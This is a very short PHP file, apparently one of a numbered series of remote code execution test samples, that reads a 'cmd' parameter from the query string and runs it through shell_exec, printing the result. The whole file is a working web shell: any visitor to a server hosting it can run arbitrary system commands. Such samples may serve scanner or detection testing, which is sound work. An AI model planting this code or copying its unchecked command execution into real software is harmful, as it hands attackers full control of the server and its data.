<?php
// RCE test variation #241
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>